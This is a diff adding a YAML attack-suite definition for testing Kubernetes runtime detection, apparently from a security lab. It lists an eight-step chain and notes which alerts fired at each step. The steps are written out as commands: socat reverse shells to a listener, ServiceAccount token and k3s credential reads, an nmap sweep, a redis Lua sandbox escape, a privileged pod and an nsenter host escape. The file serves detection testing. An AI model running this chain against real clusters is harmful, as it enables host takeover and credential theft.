@@ -1,0 +1,273 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: iktlinz-2027-chain
+  description: |
+    The IKT-Linz chain, one attack per silent_miss_gate entry in the
+    window.json that run-iktlinz-e2e.sh emits.
+
+    expectedDetections are OBSERVED, not derived. They come from a full
+    20/20 run against bound SBoBs, read out of the node-agent alert stream
+    keyed by RuleID + containerName + profileMetadata.name, cross-checked
+    against Ran's execution records for the actor of each step.
+
+    Read the per-step notes before scoring. FIVE of the eight steps run in a
+    container with NO user-defined profile: agent-worker, because the
+    orchestrator creates worker pods per task and never stamps the
+    kubescape.io/user-defined-profile label, and ran-privileged, because it is
+    attacker-created and there is no workload to bind. node-agent covers both
+    as rogue artefacts. Rules that need a profile to define "unexpected"
+    cannot fire there, so the absence is structural, not a tuning miss.
+
+    The shape of the result is worth stating plainly, because it inverts what
+    a reader expects. Coverage is HIGHEST at the start of the chain and
+    DISAPPEARS at the end:
+
+      redis-rce               5 detections   (redis is bound)
+      cve-2026-47701-extract  2
+      worker-callback         1   rogue-artefact coverage of the pod only
+      nmap-sweep              1
+      privileged-pod          1   rogue-artefact coverage of the pod only
+      sa-token-read           0
+      host-escape             0
+      k3s-credential-read     0
+
+    The two steps that end in full node and cluster compromise raise nothing
+    at all. An empty expectedDetections here is a measured zero, never a
+    placeholder.
+
+    VARIABLE CONTRACT. A dollar-prefixed name here is substituted from window.json's resolved
+    block iff its lowercased name is a key there: $LISTENER <- resolved.listener,
+    $SCAN_CIDR <- resolved.scan_cidr, $REDIS_IP <- resolved.redis_ip. Nothing
+    maps names on the scoring side, so a new variable needs the runner to emit
+    the matching key and nothing else.
+
+    ACTOR SCOPING. A plain value scopes the whole step to that actor. Only
+    k3s-credential-read is actor "host": it runs wholly after nsenter, so its
+    rows carry hostname=<resolved.node> and pod=''. host-escape is NOT a
+    host step — its nsenter process starts and exits inside ran-privileged,
+    so scoping it to the node would lose the exit. No entry in this suite
+    crosses the boundary mid-step.
+
+    DETECTION disappears at the end of the chain; EVIDENCE does not. Both of
+    those steps run after nsenter, so they are attributed to the node rather
+    than to any pod, and their rows are present on the Cilium rig carrying
+    hostname=<resolved.node> and pod=''. Scope by pod and they score a false
+    zero; scope by host and they prove out. Their actor is therefore "host",
+    not the pod that launched the escape.
+
+    It is NOT a prediction of PC 0. These fields record what the DETECTION
+    stack raised; a proof-coverage KPI scores what the STORE can prove from
+    probe rows, and the process forest runs on every node whether or not any
+    rule referred the step. So an entry with no detections can still prove out
+    above zero. Where it does come out at zero, the two causes need separating:
+    no evidence rows at all, versus an arm that captured nothing for the step
+    because no referral pulled it. Only the KPI rows can tell those apart.
+    Read these zeros as detection truth and let the KPI supply the evidence
+    truth beside them.
+
+target:
+  namespace: agent-system
+  execTarget: agent-worker
+
+attacks:
+  - name: worker-callback
+    type: cmdinject
+    gateEntry: worker-callback
+    actor: agent-system/agent-worker
+    exec: { command: ["socat", "TCP:$LISTENER:1337", "EXEC:sh"] }
+    notes: |
+      Initial foothold. Ran creates a listener on :1337 and induces a worker
+      pod to socat back to it.
+      OBSERVED: no process-level alert for socat itself. agent-worker is
+      unprofiled, so R0001 (which needs a profile to know socat is
+      unexpected) cannot fire. What did fire is R1017, because the pod is a
+      rogue artefact — which is coverage of the POD, not of the callback.
+    expectedDetections:
+      - { ruleID: R1017, ruleName: Rogue artefact, containerName: worker }
+
+  - name: sa-token-read
+    type: cmdinject
+    gateEntry: sa-token-read
+    actor: agent-system/agent-worker
+    exec: { command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"] }
+    notes: |
+      Reads the worker's own mounted ServiceAccount token.
+      OBSERVED: NO R0006 on agent-worker. This is a genuine silent miss in
+      the run and the single most important entry on this list — the same
+      action DOES raise R0006 on redis and on the otel sidecar, both of
+      which are bound. Scoring this as covered because R0006 exists in the
+      ruleset would be wrong.
+      The worker did raise R0010 in the same window, but on /etc/shadow
+      during package installation, not on the token — do not credit it here.
+    expectedDetections: []
+
+  - name: nmap-sweep
+    type: cmdinject
+    gateEntry: nmap-sweep
+    actor: agent-system/agent-worker
+    exec: { command: ["nmap", "-sT", "-F", "$SCAN_CIDR"] }
+    notes: |
+      Sweeps the /27 containing the redis target. The discriminant a
+      detector should key on is many unique destinations from one process
+      in a short window, not the binary name.
+      OBSERVED: R1012 once on agent-worker. No per-destination egress alert,
+      again because the worker is unprofiled and R0011 needs a declared
+      egress set to call a peer undeclared.
+
+      THIS STEP'S CONTENT IS NOT CAPTURABLE FROM conn_stats, and that is a
+      property of the table rather than a gap to be fixed. Measured on the
+      reference run: the worker's ONLY conn_stats peer in-window was the
+      long-lived socat callback; ZERO rows fell inside the scan range. The
+      range predicate is correct and simply has nothing to match.
+
+      The sharper form of the same fact: not even the RCE's worker->redis:6379
+      egress appears, and that connection definitely succeeded. So it is not
+      that failed connects are missing — SHORT-LIVED established egress is
+      aged or sampled away as well, and only long-lived connections survive.
+      A connect-scan is a fan of short-lived and failed attempts by
+      definition, so it is structurally invisible there.
+
+      Do not file this as a capture bug and do not expect C to improve by
+      widening the range. Scoring it would need socket-level or
+      failed-connection rows, and none exist in this stack (dc_snoop is
+      file-access and carries no network destination).
+
+      redis-rce is subject to the same limitation and only sometimes escapes
+      it, by matching on REDIS's ingress side rather than the worker's
+      egress. Measured across two runs it scored wire once and C=0 once. So
+      the difference between this entry and that one is which side of a
+      connection happened to be recorded, not how detectable the two steps
+      are.
+      The CIDR is computed at run time by demo_chain.py and anchored on the
+      redis address; it is a /27 on every topology.
+    expectedDetections:
+      - { ruleID: R1012, containerName: worker }
+
+  - name: redis-rce
+    type: cmdinject
+    gateEntry: redis-rce
+    actor: oopservability/oopservability-redis
+    exec:
+      command: ["redis-cli", "-h", "$REDIS_IP", "-p", "6379", "EVAL",
+                "local io_l = package.loadlib(...); io_l(); os.execute('id')", "0"]
+    notes: |
+      CVE-2022-0543, the Lua sandbox escape. Issued from the worker
+      foothold; the shell it spawns runs INSIDE the redis container, so the
+      actor for detection purposes is redis, while the actor for the command
+      is the worker. Both are recorded in Ran's execution records.
+      OBSERVED: fires broadly, because redis is bound to a User SBoB learned
+      from a benign-only window with 3 execs. This is the contrast case that
+      shows the three entries above are limited by profile coverage rather
+      than by rule coverage.
+      R1001 is also observed on the WORKER for the redis-cli that issues it.
+
+      THE ALERTS ABOVE ARE STABLE; THIS STEP'S WIRE EVIDENCE IS NOT. Across
+      two reference runs its proof-coverage went 0.97 wire, then 0.47 with
+      C=0, on an unchanged suite and an unchanged chain. The cause is the
+      short-lived-egress limitation recorded under nmap-sweep: whether the
+      redis connection is captured at all varies per run.
+
+      So do not treat this entry as a reliable wire baseline, and do not read
+      a drop here as a regression in the chain or the profile. The
+      expectedDetections are what stays put — they are node-agent alerts
+      judged against a bound profile, and they are the contrast this entry
+      exists to draw. The C verdict beside them is a different axis and a
+      flakier one.
+    expectedDetections:
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: sh }
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: id }
+      - { ruleID: R0002, ruleName: Files Access Anomalies in container, containerName: redis, command: sh }
+      - { ruleID: R0004, ruleName: Linux Capabilities Anomalies in container, containerName: redis, command: sh }
+      - { ruleID: R1001, ruleName: Drifted process executed, containerName: worker, command: redis-cli }
+
+  - name: cve-2026-47701-extract
+    type: cmdinject
+    gateEntry: cve-2026-47701-extract
+    actor: oopservability/oopservability-redis
+    exec: { command: ["redis-cli", "--raw", "GET", "oopservability:receiver:last-authorization"] }
+    notes: |
+      The CVE payoff. A ServiceMonitor with an unsafe bearerTokenFile makes the
+      injected OTel sidecar authenticate to redis's metric-receiver, which parks
+      the sidecar's own Bearer token in a redis key; the RCE reads it back. The
+      token belongs to agent-orchestrator and can create Pods.
+
+      SCORING THIS ENTRY DEPENDS ON THE RIG, so do not compare runs across
+      clusters without reading this:
+
+      (a) The sidecar's token READ no longer alerts, deliberately. It raised
+          R0006, but the sidecar must read its own token to authenticate at
+          all, so it is allowlisted in cp-agent-orchestrator-otel-collector.yaml
+          (the ⋯/ca.crt and ⋯/token opens). The read is not the malignant act.
+      (b) The malignant act is the token LEAVING, and that is undeclared
+          egress: the sidecar's SBoB allows exactly two peers, target-allocator
+          :80 and kube-dns :53. Redis is not among them, so R0011 SHOULD fire.
+      (c) It does not fire on the single-node k3s rig these values were
+          measured on — R0011 raised nothing there across a full chain. It DOES
+          fire on the Cilium rig. Treat an absent R0011 here as a rig property
+          to be confirmed, not as a missed detection by the chain.
+
+      Observed on the measuring rig: R0001 for redis-cli inside redis, and
+      R0006 on redis for the earlier SA-token read through the RCE.
+    expectedDetections:
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: redis-cli }
+      - { ruleID: R0006, ruleName: Unexpected service account token access, containerName: redis }
+
+  - name: privileged-pod
+    type: cmdinject
+    gateEntry: privileged-pod
+    actor: agent-system/ran-privileged
+    exec: { command: ["socat", "TCP:$LISTENER:1337", "EXEC:sh"] }
+    notes: |
+      The stolen agent-orchestrator token creates a Pod with hostPath / and
+      hostPID that calls back. Unprofiled by nature — it is attacker-created,
+      so there is no workload for anyone to have bound a profile to. Coverage
+      is therefore rogue-artefact coverage, exactly as for agent-worker, and
+      for a more defensible reason.
+      OBSERVED: R1017 only.
+    expectedDetections:
+      - { ruleID: R1017, ruleName: Rogue artefact, containerName: ran-privileged }
+
+  - name: host-escape
+    type: cmdinject
+    gateEntry: host-escape
+    actor: agent-system/ran-privileged
+    exec: { command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "hostname"] }
+    notes: |
+      Entering the host namespaces from the privileged pod. This is the step
+      the workshop builds to, and it is the LEAST visible one in the whole
+      chain: the only thing raised was the R1017 already credited to
+      privileged-pod above, carrying no path and no process detail.
+      Deliberately NOT crediting that R1017 twice.
+      ACTOR IS THE POD, not the host. The nsenter process both starts and
+      exits in ran-privileged, so its existence AND its outcome are
+      pod-attributed; scoping this step to the node loses the nsenter exit.
+      The "effect on the host" is not this step at all — it is the next one,
+      k3s-credential-read, which is wholly post-nsenter and is actor "host".
+      This entry's own content (which namespaces were entered) is the
+      nsswitch signal and is not captured yet, so its C is honestly 0
+      whatever the scope.
+      EVIDENCE SURVIVES even though detection does not — confirmed on the
+      Cilium rig, where the post-nsenter rows are present, host-attributed.
+      That was the open question on this entry and the answer is measured.
+    expectedDetections: []
+
+  - name: k3s-credential-read
+    type: cmdinject
+    gateEntry: k3s-credential-read
+    actor: host
+    exec: { command: ["cat", "/host/etc/rancher/k3s/k3s.yaml"] }
+    notes: |
+      Reading the cluster credentials off the mounted host filesystem — the
+      end state of the chain, full cluster compromise.
+      OBSERVED: no alert of any kind — no R0010, no R0002, nothing
+      path-bearing. There is no baseline that could call the read unexpected.
+      BUT THE EVIDENCE IS THERE. The read happens after nsenter, so it is
+      host-attributed: confirmed on the Cilium rig as cat rows carrying
+      hostname=<resolved.node> and pod=''. Scope by those two and this proves
+      out; scope by pod and it scores a false zero. The runner emits the node
+      name in window.json's resolved block for exactly this.
+      This and host-escape are the two entries I would put in front of anyone
+      arguing the chain is well covered: the first and least damaging steps
+      raise the most, and the last and most damaging raise nothing.
+    expectedDetections: []
